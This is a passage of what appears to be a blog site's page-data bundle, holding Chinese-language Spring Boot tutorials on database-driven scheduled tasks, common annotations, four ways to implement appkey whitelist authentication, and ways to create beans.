groupId > mysql </ groupId > \n             < artifactId > mysql-connector-java </ artifactId > \n         </ dependency > \n         < dependency > \x3c!--添加Mybatis依赖 配置mybatis的一些初始化的东西--\x3e \n             < groupId > org.mybatis.spring.boot </ groupId > \n             < artifactId > mybatis-spring-boot-starter </ artifactId > \n             < version > 1.3.1 </ version > \n         </ dependency > \n         < dependency > \x3c!-- 添加mybatis依赖 --\x3e \n             < groupId > org.mybatis </ groupId > \n             < artifactId > mybatis </ artifactId > \n             < version > 3.4.5 </ version > \n             < scope > compile </ scope > \n         </ dependency > \n     </ dependencies > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #  2、添加数据库记录： \n 开启本地数据库mysql，随便打开查询窗口，然后执行脚本内容，如下： \n DROP   DATABASE   IF   EXISTS   ` socks ` ; \n CREATE   DATABASE   ` socks ` ; \n USE   ` SOCKS ` ; \n DROP   TABLE   IF   EXISTS   ` cron ` ; \n CREATE   TABLE   ` cron `    ( \n   ` cron_id `   varchar ( 30 )   NOT   NULL   PRIMARY   KEY , \n   ` cron `   varchar ( 30 )   NOT   NULL   \n ) ; \n INSERT   INTO   ` cron `   VALUES   ( \'1\' ,   \'0/5 * * * * ?\' ) ; \n \n 1 2 3 4 5 6 7 8 9 然后在项目中的application.yml 添加数据源： \n spring : \n   datasource : \n     url :  jdbc : mysql : //localhost : 3306/socks\n     username :  root\n     password :   123456 \n \n 1 2 3 4 5 #  3、创建定时器 \n 数据库准备好数据之后，我们编写定时任务，注意这里添加的是TriggerTask，目的是循环读取我们在数据库设置好的执行周期，以及执行相关定时任务的内容。\n具体代码如下： \n @Configuration        //1.主要用于标记配置类，兼备Component的效果。 \n @EnableScheduling     // 2.开启定时任务 \n public   class   DynamicScheduleTask   implements   SchedulingConfigurer   { \n\n     @Mapper \n     public   interface   CronMapper   { \n         @Select ( "select cron from cron limit 1" ) \n         public   String   getCron ( ) ; \n     } \n\n     @Autowired        //注入mapper \n     @SuppressWarnings ( "all" ) \n     CronMapper  cronMapper ; \n\n     /**\n     * 执行定时任务.\n     */ \n     @Override \n     public   void   configureTasks ( ScheduledTaskRegistrar  taskRegistrar )   { \n\n        taskRegistrar . addTriggerTask ( \n                 //1.添加任务内容(Runnable) \n                 ( )   ->   System . out . println ( "执行动态定时任务: "   +   LocalDateTime . now ( ) . toLocalTime ( ) ) , \n                 //2.设置执行周期(Trigger) \n                triggerContext  ->   { \n                     //2.1 从数据库获取执行周期 \n                     String  cron  =  cronMapper . getCron ( ) ; \n                     //2.2 合法性校验. \n                     if   ( StringUtils . isEmpty ( cron ) )   { \n                         // Omitted Code .. \n                     } \n                     //2.3 返回执行周期(Date) \n                     return   new   CronTrigger ( cron ) . nextExecutionTime ( triggerContext ) ; \n                 } \n         ) ; \n     } \n\n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 注意： 如果在数据库修改时格式出现错误，则定时任务会停止，即使重新修改正确；此时只能重新启动项目才能恢复。 \n 三、多线程定时任务 \n 基于注解设定多线程定时任务 \n 创建多线程定时任务 \n //@Component注解用于对那些比较中立的类进行注释； \n //相对与在持久层、业务层和控制层分别采用 @Repository、@Service 和 @Controller 对分层中的类进行注释 \n @Component \n @EnableScheduling     // 1.开启定时任务 \n @EnableAsync          // 2.开启多线程 \n public   class   MultithreadScheduleTask   { \n\n         @Async \n         @Scheduled ( fixedDelay  =   1000 )    //间隔1秒 \n         public   void   first ( )   throws   InterruptedException   { \n             System . out . println ( "第一个定时任务开始 : "   +   LocalDateTime . now ( ) . toLocalTime ( )   +   "\\r\\n线程 : "   +   Thread . currentThread ( ) . getName ( ) ) ; \n             System . out . println ( ) ; \n             Thread . sleep ( 1000   *   10 ) ; \n         } \n\n         @Async \n         @Scheduled ( fixedDelay  =   2000 ) \n         public   void   second ( )   { \n             System . out . println ( "第二个定时任务开始 : "   +   LocalDateTime . now ( ) . toLocalTime ( )   +   "\\r\\n线程 : "   +   Thread . currentThread ( ) . getName ( ) ) ; \n             System . out . println ( ) ; \n         } \n     } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 并且，由于开启了多线程，第一个任务的执行时间也不受其本身执行时间的限制，所以需要注意可能会出现重复操作导致数据异常。 \n'},{title:"Spring Boot 中常见的注解",frontmatter:{title:"Spring Boot 中常见的注解",date:"2022-01-16T19:53:38.000Z",tags:["springboot","annotation"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_annotation.html",relativePath:"blogs/springboot/springboot_annotation.md",key:"v-85468472",path:"/blogs/springboot/springboot_annotation.html",headers:[{level:2,title:"一.SpringBoot/spring",slug:"一-springboot-spring"},{level:3,title:"@SpringBootApplication:",slug:"springbootapplication"},{level:3,title:"@Repository:",slug:"repository"},{level:3,title:"@Service:",slug:"service"},{level:3,title:"@RestController:",slug:"restcontroller"},{level:3,title:"@Controller:",slug:"controller"},{level:3,title:"@Component:",slug:"component"},{level:3,title:"@ResponseBody:",slug:"responsebody"},{level:3,title:"@RequestBody:",slug:"requestbody"},{level:3,title:"@ComponentScan:",slug:"componentscan"},{level:3,title:"@Configuration:",slug:"configuration"},{level:3,title:"@Import：",slug:"import"},{level:3,title:"@ImportResource：",slug:"importresource"},{level:3,title:"@Bean:",slug:"bean"},{level:3,title:"@Value：",slug:"value"},{level:3,title:"@Inject：",slug:"inject"},{level:3,title:"@EnableAutoConfiguration:",slug:"enableautoconfiguration"},{level:3,title:"@AutoWired:",slug:"autowired"},{level:3,title:"@Qualifier:",slug:"qualifier"},{level:3,title:'@Resource(name="name",type="type")：',slug:"resource-name-name-type-type"},{level:3,title:"@RequestMapping:",slug:"requestmapping"},{level:3,title:"@GetMapping、@PostMapping等:",slug:"getmapping、-postmapping等"},{level:3,title:"@RequestParam:",slug:"requestparam"},{level:3,title:"@PathVariable:",slug:"pathvariable"},{level:3,title:"@JsonBackReference",slug:"jsonbackreference"},{level:3,title:"@RepositoryRestResourcepublic",slug:"repositoryrestresourcepublic"},{level:2,title:"二.Jpa",slug:"二-jpa"},{level:3,title:"@Entity:",slug:"entity"},{level:3,title:'@Table(name=""):',slug:"table-name"},{level:3,title:"@MappedSuperClass:",slug:"mappedsuperclass"},{level:3,title:"@NoRepositoryBean:",slug:"norepositorybean"},{level:3,title:"@Column:",slug:"column"},{level:3,title:"@Id:",slug:"id"},{level:3,title:'@GeneratedValue(strategy=GenerationType.SEQUENCE,generator = "repair_seq"):',slug:"generatedvalue-strategy-generationtype-sequence-generator-repair-seq"},{level:3,title:'@SequenceGeneretor(name = "repairseq", sequenceName = "seqrepair", allocationSize = 1):',slug:"sequencegeneretor-name-repair-seq-sequencename-seq-repair-allocationsize-1"},{level:3,title:"@Transient:",slug:"transient"},{level:3,title:"@Basic(fetch=FetchType.LAZY):",slug:"basic-fetch-fetchtype-lazy"},{level:3,title:"@JsonIgnore:",slug:"jsonignore"},{level:3,title:'@JoinColumn(name="loginId"):',slug:"joincolumn-name-loginid"},{level:3,title:"@OneToOne",slug:"onetoone"},{level:3,title:"@OneToMany",slug:"onetomany"},{level:3,title:"@ManyToOne:",slug:"manytoone"},{level:2,title:"三.全局异常处理",slug:"三-全局异常处理"},{level:3,title:"@ControllerAdvice:",slug:"controlleradvice"},{level:3,title:"@ExceptionHandler(Exception.class):",slug:"exceptionhandler-exception-class"},{level:2,title:"四.springcloud",slug:"四-springcloud"},{level:3,title:"@EnableEurekaServer:",slug:"enableeurekaserver"},{level:3,title:"@EnableDiscoveryClient:",slug:"enablediscoveryclient"},{level:3,title:"@LoadBalanced:",slug:"loadbalanced"},{level:3,title:"@EnableCircuitBreaker:",slug:"enablecircuitbreaker"},{level:3,title:'@HystrixCommand(fallbackMethod="backMethod"):',slug:"hystrixcommand-fallbackmethod-backmethod"},{level:3,title:"@EnableConfigServer:",slug:"enableconfigserver"},{level:3,title:"@EnableZuulProxy:",slug:"enablezuulproxy"},{level:3,title:"@SpringCloudApplication:",slug:"springcloudapplication"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 一.SpringBoot/spring \n @SpringBootApplication: \n 包含@Configuration、@EnableAutoConfiguration、@ComponentScan通常用在主类上； \n @Repository: \n 用于标注数据访问组件，即DAO组件； \n @Service: \n 用于标注业务层组件； \n @RestController: \n 用于标注控制层组件(如struts中的action)，包含@Controller和@ResponseBody； \n @Controller: \n 用于标注是控制层组件，需要返回页面时请用@Controller而不是@RestController； \n @Component: \n 泛指组件，当组件不好归类的时候，我们可以使用这个注解进行标注； \n @ResponseBody: \n 表示该方法的返回结果直接写入HTTP response body中，一般在异步获取数据时使用，在使用@RequestMapping后，返回值通常解析为跳转路径，\n加上@responsebody后返回结果不会被解析为跳转路径，而是直接写入HTTP response body中；比如异步获取json数据，加上@responsebody后，会直接返回json数据； \n @RequestBody: \n 参数前加上这个注解之后，认为该参数必填。表示接受json字符串转为对象 List等； \n @ComponentScan: \n 组件扫描。个人理解相当于，如果扫描到有@Component @Controller @Service等这些注解的类，则把这些类注册为bean \n @Configuration: \n 指出该类是 Bean 配置的信息源，相当于XML中的，一般加在主类上； \n @Import： \n 用来导入其他配置类。 \n @ImportResource： \n 用来加载xml配置文件。 \n @Bean: \n 相当于XML中的,放在方法的上面，而不是类，意思是产生一个bean,并交给spring管理； \n @Value： \n 注入Spring boot application.properties配置的属性的值。 \n @Inject： \n 等价于默认的@Autowired，只是没有required属性 \n @EnableAutoConfiguration: \n 让 Spring Boot 根据应用所声明的依赖来对 Spring 框架进行自动配置，一般加在主类上； \n @AutoWired: \n byType方式。把配置好的Bean拿来用，完成属性、方法的组装，它可以对类成员变量、方法及构造函数进行标注，完成自动装配的工作；\n当加上（required=false）时，就算找不到bean也不报错； \n @Qualifier: \n 当有多个同一类型的Bean时，可以用@Qualifier("name")来指定。与@Autowired配合使用； \n @Resource(name="name",type="type")： \n 没有括号内内容的话，默认byName。与@Autowired干类似的事； \n @RequestMapping: \n RequestMapping是一个用来处理请求地址映射的注解，可用于类或方法上。用于类上，表示类中的所有响应请求的方法都是以该地址作为父路径； \n 该注解有六个属性:\nparams:指定request中必须包含某些参数值是，才让该方法处理。\nheaders:指定request中必须包含某些指定的header值，才能让该方法处理请求。\nvalue:指定请求的实际地址，指定的地址可以是URI Template 模式\nmethod:指定请求的method类型， GET、POST、PUT、DELETE等\nconsumes:指定处理请求的提交内容类型（Content-Type），如application/json,text/html;\nproduces:指定返回的内容类型，仅当request请求头中的(Accept)类型中包含该指定类型才返回。\n @GetMapping、@PostMapping等: \n 相当于@RequestMapping（value="/"，method=RequestMethod.GetPostPutDelete等） 。是个组合注解； \n @RequestParam: \n 用在方法的参数前面。相当于 request.getParameter； \n @PathVariable: \n 路径变量。如 RequestMapping("user/get/mac/{macAddress}") ； \n public   String   getByMacAddress ( \n @PathVariable ( "macAddress" )   String  macAddress ) { \n     //do something; \n } \n \n 1 2 3 4 参数与大括号里的名字相同的话，注解后括号里的内容可以不填。 \n @JsonBackReference \n 解决嵌套外链问题 \n @RepositoryRestResourcepublic \n 配合spring-boot-starter-data-rest使用 \n 二.Jpa \n @Entity: \n @Table(name=""): \n 表明这是一个实体类。一般用于jpa ，这两个注解一般一块使用，但是如果表名和实体类名相同的话，@Table可以省略； \n @MappedSuperClass: \n 用在确定是父类的entity上。父类的属性子类可以继承； \n @NoRepositoryBean: \n 一般用作父类的repository，有这个注解，spring不会去实例化该repository； \n @Column: \n 如果字段名与列名相同，则可以省略； \n @Id: \n 表示该属性为主键； \n @GeneratedValue(strategy=GenerationType.SEQUENCE,generator = "repair_seq"): \n 表示主键生成策略是sequence（可以为Auto、IDENTITY、native等，Auto表示可在多个数据库间切换），指定sequence的名字是repair_seq； \n @SequenceGeneretor(name = "repair_seq", sequenceName = "seq_repair", allocationSize = 1): \n name为sequence的名称，以便使用，sequenceName为数据库的sequence名称，两个名称可以一致； \n @Transient: \n 表示该属性并非一个到数据库表的字段的映射,ORM框架将忽略该属性.\n如果一个属性并非数据库表的字段映射,就务必将其标示为@Transient,否则,ORM框架默认其注解为@Basic； \n @Basic(fetch=FetchType.LAZY): \n 标记可以指定实体属性的加载方式； \n @JsonIgnore: \n 作用是json序列化时将java bean中的一些属性忽略掉,序列化和反序列化都受影响； \n @JoinColumn(name="loginId"): \n 一对一：本表中指向另一个表的外键。一对多：另一个表指向本表的外键。 \n @OneToOne \n 对应Hibernate配置文件中的一对一 \n @OneToMany \n 对应Hibernate配置文件中的一对多 \n @ManyToOne: \n 对应Hibernate配置文件中的多对一 \n 三.全局异常处理 \n @ControllerAdvice: \n 包含@Component。可以被扫描到。统一处理异常； \n @ExceptionHandler(Exception.class): \n 用在方法上面表示遇到这个异常就执行以下方法。 \n 四.springcloud \n @EnableEurekaServer: \n 用在springboot启动类上，表示这是一个eureka服务注册中心； \n @EnableDiscoveryClient: \n 用在springboot启动类上，表示这是一个服务，可以被注册中心找到； \n @LoadBalanced: \n 开启负载均衡能力； \n @EnableCircuitBreaker: \n 用在启动类上，开启断路器功能； \n @HystrixCommand(fallbackMethod="backMethod"): \n 用在方法上，fallbackMethod指定断路回调方法； \n @EnableConfigServer: \n 用在启动类上，表示这是一个配置中心，开启Config Server； \n @EnableZuulProxy: \n 开启zuul路由，用在启动类上； \n @SpringCloudApplication: \n 包含 \n \n @SpringBootApplication \n @EnableDiscovertyClient \n @EnableCircuitBreaker \n \n 分别是SpringBoot注解、注册服务中心Eureka注解、断路器注解。对于SpringCloud来说，这是每一微服务必须应有的三个注解，所以才推出了@SpringCloudApplication这一注解集合。 \n'},{title:"Spring Boot 实现通用 Auth 认证的 4 种方式",frontmatter:{title:"Spring Boot 实现通用 Auth 认证的 4 种方式",date:"2021-11-11 17:24:38",tags:["SpringBoot","Auth"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_auth.html",relativePath:"blogs/springboot/springboot_auth.md",key:"v-00a26d55",path:"/blogs/springboot/springboot_auth.html",headers:[{level:2,title:"前言",slug:"前言"},{level:2,title:"传统AOP",slug:"传统aop"},{level:3,title:"实现",slug:"实现"},{level:3,title:"扩展",slug:"扩展"},{level:2,title:"Interceptor",slug:"interceptor"},{level:3,title:"实现",slug:"实现-2"},{level:3,title:"扩展",slug:"扩展-2"},{level:2,title:"ArgumentResolver",slug:"argumentresolver"},{level:3,title:"实现",slug:"实现-3"},{level:3,title:"扩展",slug:"扩展-3"},{level:2,title:"Filter",slug:"filter"},{level:3,title:"扩展",slug:"扩展-4"},{level:2,title:"小结",slug:"小结"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 文章介绍了spring-boot中实现通用auth的四种方式，包括 传统AOP、拦截器、参数解析器和过滤器，并提供了对应的实例代码，最后简单总结了下他们的执行顺序。 \n 前言 \n 最近一直被无尽的业务需求淹没，没时间喘息，终于接到一个能让我突破代码舒适区的活儿，解决它的过程非常曲折，一度让我怀疑人生，不过收获也很大，代码方面不明显，但感觉自己抹掉了 java、Tomcat、Spring 一直挡在我眼前的一层纱。对它们的理解上了一个新的层次。\n好久没输出了，于是挑一个方面总结一下，希望在梳理过程中再了解一些其他的东西。由于 Java 繁荣的生态，下面每一个模块都有大量的文章专门讲述。所以我选了另外一个角度，从实际问题出发，将这些分散的知识串联起来，各位可以作为一个综述来看。各个模块的极致详细介绍，大家可以去翻官方文档或看网络上的其他博客。\n需求很简单清晰，跟产品们提的妖艳需求一点也不一样：在我们的 web 框架里添加一个通用的 appkey 白名单校验功能，希望它的扩展性更好一些。\n这个 web 框架是部门前驱者基于 spring-boot 实现的，介于业务和 Spring 框架之间，做一些偏向于业务的通用性功能，如 日志输出、功能开关、通用参数解析等。平常是对业务透明的，最近一直忙于把需求做好，代码写好，甚至从没注意过它的存在。 \n 传统AOP \n 对于这种需求，首先想到的当然是 Spring-boot 提供的 AOP 接口，只需要在 Controller 方法前添加切点，然后再对切点进行处理即可。 \n 实现 \n 其使用步骤如下： \n \n 使用 @Aspect 声明一下切面类 WhitelistAspect； \n 在切面类内添加一个切点 whitelistPointcut()，为了实现此切点灵活可装配的能力，这里不使用 execution 全部拦截，而是添加一个注解 @Whitelist，被注解的方法才会校验白名单。 \n 在切面类中使用 spring 的 AOP 注解 @Before 声明一个通知方法 checkWhitelist() 在 Controller 方法被执行之前校验白名单。 \n \n 切面类伪代码如下 \n \n @Aspect \n public   class   WhitelistAspect   { \n\n  @Before ( value  =   "whitelistPointcut() && @annotation(whitelist)" ) \n  public   void   checkAppkeyWhitelist ( JoinPoint  joinPoint ,   Whitelist  whitelist )   { \n      checkWhitelist ( ) ; \n      // 可使用 joinPoint.getArgs() 获取Controller方法的参数 \n      // 可以使用 whitelist 变量获取注解参数 \n  } \n\n\n  @Pointcut ( "@annotation(com.zhenbianshu.Whitelist)" ) \n  public   void   whitelistPointCut ( )   { \n  } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 在Controller方法上添加 @Whitelist 注解实现功能。 \n 扩展 \n 本例中使用了 注解 来声明切点，并且我实现了通过注解参数来声明要校验的白名单，如果之后还需要添加其他白名单的话，如通过 UID 来校验，则可以为此注解添加 uid() 等方法，实现自定义校验。\n此外，spring 的 AOP 还支持 execution（执行方法） 、bean（匹配特定名称的 Bean 对象的执行方法）等切点声明方法和 @Around（在目标函数执行中执行） 、@After（方法执行后） 等通知方法。\n如此，功能已经实现了 \n Interceptor \n Spring 的 拦截器(Interceptor) 实现这个功能也非常合适。顾名思义，拦截器用于在 Controller 内 Action 被执行前通过一些参数判断是否要执行此方法，要实现一个拦截器，可以实现 Spring 的 HandlerInterceptor 接口。 \n 实现 \n 实现步骤如下： \n \n 定义拦截器类 AppkeyInterceptor 类并实现 HandlerInterceptor 接口。 \n 实现其 preHandle() 方法； \n 在 preHandle 方法内通过注解和参数判断是否需要拦截请求，拦截请求时接口返回 false； \n 在自定义的 WebMvcConfigurerAdapter 类内注册此拦截器； \n \n AppkeyInterceptor 类如下： \n @Component \n public   class   WhitelistInterceptor   implements   HandlerInterceptor   { \n\n     @Override \n     public   boolean   preHandle ( HttpServletRequest  request ,   HttpServletResponse  response ,   Object  handler )   throws   Exception   { \n         Whitelist  whitelist  =   ( ( HandlerMethod )  handler ) . getMethodAnnotation ( Whitelist . class ) ; \n         // whitelist.values(); 通过 request 获取请求参数，通过 whitelist 变量获取注解参数 \n         return   true ; \n     } \n\n     @Override \n     public   void   postHandle ( HttpServletRequest  request ,   HttpServletResponse  response ,   Object  handler ,   ModelAndView  modelAndView )   throws   Exception   { \n   // 方法在Controller方法执行结束后执行 \n     } \n\n     @Override \n     public   void   afterCompletion ( HttpServletRequest  request ,   HttpServletResponse  response ,   Object  handler ,   Exception  ex )   throws   Exception   { \n   // 在view视图渲染完成后执行 \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #  扩展 \n 要启用 拦截器还要显式配置它启用，这里我们使用 WebMvcConfigurerAdapter 对它进行配置。需要注意，继承它的的 MvcConfiguration 需要在 ComponentScan 路径下。 \n @Configuration \n public   class   MvcConfiguration   extends   WebMvcConfigurerAdapter   { \n     @Override \n     public   void   addInterceptors ( InterceptorRegistry  registry )   { \n        registry . addInterceptor ( new   WhitelistInterceptor ( ) ) . addPathPatterns ( "/*" ) . order ( 1 ) ; \n         // 这里可以配置拦截器启用的 path 的顺序，在有多个拦截器存在时，任一拦截器返回 false 都会使后续的请求方法不再执行 \n     } \n } \n \n 1 2 3 4 5 6 7 8 还需要注意，拦截器执行成功后响应码为 200，但响应数据为空。\n当使用拦截器实现功能后，领导终于祭出大招了：我们已经有一个 Auth 参数了，appkey 可以从 Auth 参数里取到，可以把在不在白名单作为 Auth 的一种方式，为什么不在 Auth 时校验？ \n ArgumentResolver \n 参数解析器是 Spring 提供的用于解析自定义参数的工具，我们常用的 @RequestParam 注解就有它的影子，使用它，我们可以将参数在进入Controller Action之前就组合成我们想要的样子。 \n Spring 会维护一个 ResolverList， 在请求到达时，Spring 发现有自定义类型参数（非基本类型）， 会依次尝试这些 Resolver，直到有一个 Resolver 能解析需要的参数。要实现一个参数解析器，需要实现 HandlerMethodArgumentResolver 接口。 \n 实现 \n \n 定义自定义参数类型 AuthParam，类内有 appkey 相关字段； \n 定义 AuthParamResolver 并实现 HandlerMethodArgumentResolver 接口； \n 实现 supportsParameter() 接口方法将 AuthParam 与 AuthParamResolver 适配起来； \n 实现 resolveArgument() 接口方法解析 reqest 对象生成 AuthParam 对象，并在此校验 AuthParam ，确认 appkey 是否在白名单内； \n 在 Controller Action 方法上签名内添加 AuthParam 参数以启用此 Resolver; \n \n 实现的 AuthParamResolver 类如下： \n @Component \n public   class   AuthParamResolver   implements   HandlerMethodArgumentResolver   { \n\n     @Override \n     public   boolean   supportsParameter ( MethodParameter  parameter )   { \n         return  parameter . getParameterType ( ) . equals ( AuthParam . class ) ; \n     } \n\n     @Override \n     public   Object   resolveArgument ( MethodParameter  parameter ,   ModelAndViewContainer  mavContainer ,   NativeWebRequest  webRequest ,   WebDataBinderFactory  binderFactory )   throws   Exception   { \n         Whitelist  whitelist  =  parameter . getMethodAnnotation ( Whitelist . class ) ; \n         // 通过 webRequest 和 whitelist 校验白名单 \n         return   new   AuthParam ( ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #  扩展 \n 当然，使用参数解析器也需要单独配置，我们同样在 WebMvcConfigurerAdapter内配置： \n @Configuration \n public   class   MvcConfiguration   extends   WebMvcConfigurerAdapter   { \n\n     @Override \n     public   void   addArgumentResolvers ( List < HandlerMethodArgumentResolver >  argumentResolvers )   { \n        argumentResolvers . add ( new   AuthParamResolver ( ) ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 这次实现完了，我还有些不放心，于是在网上查找是否还有其他方式可以实现此功能，发现常见的还有 Filter. \n Filter \n Filter 并不是 Spring 提供的，它是在 Servlet 规范中定义的，是 Servlet 容器支持的。被 Filter 过滤的请求，不会派发到 Spring 容器中。它的实现也比较简单，实现 javax.servlet.Filter接口即可。\n由于不在 Spring 容器中，Filter 获取不到 Spring 容器的资源，只能使用原生 Java 的 ServletRequest 和 ServletResponse 来获取请求参数。\n另外，在一个 Filter 中要显示调用 FilterChain 的 doFilter 方法，不然认为请求被拦截。实现类似： \n public   class   WhitelistFilter   implements   javax . servlet . Filter   { \n\n     @Override \n     public   void   init ( FilterConfig  filterConfig )   throws   ServletException   { \n   // 初始化后被调用一次 \n     } \n\n     @Override \n     public   void   doFilter ( ServletRequest  request ,   ServletResponse  response ,   FilterChain  chain )   throws   IOException ,   ServletException   { \n      // 判断是否需要拦截 \n       chain . doFilter ( request ,  response ) ;   // 请求通过要显示调用 \n     } \n\n     @Override \n     public   void   destroy ( )   { \n      // 被销毁时调用一次 \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #  扩展 \n Filter 也需要显示配置： \n @Configuration \n public   class   FilterConfiguration   { \n\n     @Bean \n     public   FilterRegistrationBean   someFilterRegistration ( )   { \n         FilterRegistrationBean  registration  =   new   FilterRegistrationBean ( ) ; \n        registration . setFilter ( new   WhitelistFilter ( ) ) ; \n        registration . addUrlPatterns ( "/*" ) ; \n        registration . setName ( "whitelistFilter" ) ; \n        registration . setOrder ( 1 ) ;   // 设置过滤器被调用的顺序 \n         return  registration ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 #  小结 \n 四种实现方式都有其适合的场景，那么它们之间的调用顺序如何呢？\nFilter 是 Servlet 实现的，自然是最先被调用，后续被调用的是 Interceptor 被拦截了自然不需要后续再进行处理，然后是 参数解析器，最后才是 切面的切点。 \n'},{title:"SpringBoot Bean的基本定义与使用",frontmatter:{title:"SpringBoot Bean的基本定义与使用",date:"2021-12-05 15:44:48",tags:["springboot"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_bean_create.html",relativePath:"blogs/springboot/springboot_bean_create.md",key:"v-23250675",path:"/blogs/springboot/springboot_bean_create.html",headers:[{level:2,title:"Bean的几种创建方式",slug:"bean的几种创建方式"},{level:3,title:"XML 方式",slug:"xml-方式"},{level:3,title:"注解方式",slug:"注解方式"},{level:3,title:"@Bean定义方式",slug:"bean定义方式"},{level:3,title:"使用注解@Import",slug:"使用注解-import"},{level:3,title:"工厂类方式",slug:"工厂类方式"},{level:2,title:"bean 的使用",slug:"bean-的使用"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 在Spring中，有两个非常有名的特性，依赖注入（DI）与切面（AOP)，其中依赖注入其主要的作用，可以说就是维护Spring容器创建的Bean之间的依赖关系，简单来说就是一个bean（假定名为A）持有另一个Bean（假定名为B）的引用作为成员变量b，则由Spring容器自动将B赋值给A的成员变量b.因此在想理解依赖注入，就有必要了解下创建和使用Bean的几种姿势 \n Bean的几种创建方式 \n 在SpringBoot的大环境下，基本上不再使用以前的xml配置，所以本篇博文也不再介绍以往Spring中，通过xml来声明bean的使用方式 \n XML 方式 \n 使用Spring XML方式配置，该方式用于在纯Spring 应用中，适用于简单的小应用，当应用变得复杂，将会导致XMl配置文件膨胀 ，不利于对象管理。 \n < bean   id = " xxxx "    class = " xxxx.xxxx " /> \n \n 1 #  注解方式 \n 使用@Component,@Service,@Controler,@Repository注解\n这几个注解都是同样的功能，被注解的类将会被Spring 容器创建单例对象。 \n \n @Component : 侧重于通用的Bean类 \n @Service：标识该类用于业务逻辑 \n @Controler：标识该类为Spring MVC的控制器类 \n @Repository: 标识该类是一个实体类，只有属性和Setter,Getter \n \n 一个典型的实例如下 \n @Component \n public   class   AnoDemoBean   { \n     private   String  type  =   "AnoDemoBean" ; \n\n     public   String   getName ( String  name )   { \n         return  name  +   " _"   +  type ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 当用于Spring Boot应用时，被注解的类必须在启动类的根路径或者子路径下，否则不会生效。\n如果不在，可以使用@ComponentScan标注扫描的路径。\nspring xml 也有相关的标签 \n @ComponentScan ( value = { "com.microblog.blog" , "com.microblog.common" } ) \n public   class   MicroblogBlogApplication   { \n     public   static   void   main ( String  args [ ] ) { \n         SpringApplication . run ( MicroblogBlogApplication . class , args ) ; \n     } \n } \n \n 1 2 3 4 5 6 #  @Bean定义方式 \n 使用@Bean注解,这种方式用在Spring Boot 应用中。\n@Configuration 标识这是一个Spring Boot 配置类，其将会扫描该类中是否存在@Bean 注解的方法，比如如下代码，将会创建User对象并放入容器中。\n@ConditionalOnBean 用于判断存在某个Bean时才会创建User Bean.\n这里创建的Bean名称默认为方法的名称user。也可以@Bean("xxxx")定义。 \n @Data \n public   class   ConfigDemoBean   { \n     private   String  type  =   "ConfigDemoBean" ; \n\n     public   String   getName ( String  name )   { \n         return  name  +   " _"   +  type ; \n     } \n } \n\n @Configuration \n public   class   BeanLoadConfig   { \n     @Bean \n     public   ConfigDemoBean   configDemoBean ( )   { \n         return   new   ConfigDemoBean ( ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 需要说明的一点是BeanLoadConfig类本身也被Spring容器看为一个Bean \n 使用注解@Import \n 使用注解@Import,也会创建对象并注入容器中 \n @Import ( User . class ) \n public   class   MicroblogUserWebApplication   { \n     public   static   void   main ( String  args [ ] )   { \n         SpringApplication . run ( MicroblogUserWebApplication . class ,  args ) ; \n     } \n } \n \n 1 2 3 4 5 6 #  工厂类方式 \n FactoryBean本质上也是一个Bean，但是可以通过他来生成你期待的Bean，在实际的业务场景中可能使用场景不多，但是在抽象的框架层面应用很广，一个简单的使用姿势如 \n public   class   FacDemoBean   { \n     private   String  type  =   "FacDemoBean" ; \n\n     public   String   getName ( String  name )   { \n         return  name  +   " _"   +  type ; \n     } \n } \n\n public   class   DemoFactoryBean   implements   FactoryBean < FacDemoBean >   { \n     @Override \n     public   FacDemoBean   getObject ( )   throws   Exception   { \n         return   new   FacDemoBean ( ) ; \n     } \n\n     @Override \n     public   Class < ? >   getObjectType ( )   { \n         return   FacDemoBean . class ; \n     } \n\n     @Override \n     public   boolean   isSingleton ( )   { \n         return   true ; \n     } \n } \n\n @Configuration \n public   class   BeanLoadConfig   { \n     @Bean \n     public   DemoFactoryBean   demoFactoryBean ( )   { \n         return   new   DemoFactoryBean ( ) ; \n     } \n\n     @Bean \n     public   FacDemoBean   facDemoBean ( DemoFactoryBean  demoFactoryBean )   throws   Exception   { \n         return  demoFactoryBean . getObject ( ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #  bean 的使用 \n 参考  Spring中的三种依赖注入方式 \n'},{title:"Spring中生成Bean时默认生成名称策略",frontmatter:{title:"Spring中生成Bean时默认生成名称策略",date:"2021-12-05 13:42:40",tags:["springboot"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_bean_default_name.html",relativePath:"blogs/springboot/springboot_bean_default_name.md",key:"v-613522d6",path:"/blogs/springboot/springboot_bean_default_name.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 在使用注解生成Bean的时候，如果没有指定Bean的名称，如@Componet("mytable")，则Spring会使用默认的名称生成策略，具体源码如下: \n public   class   AnnotationBeanNameGenerator   implements   BeanNameGenerator   { \n\n     private   static   final   String  COMPONENT_ANNOTATION_CLASSNAME  =   "org.springframework.stereotype.Component" ; \n\n\n     public   String   generateBeanName ( BeanDefinition  definition ,   BeanDefinitionRegistry  registry )   { \n         if   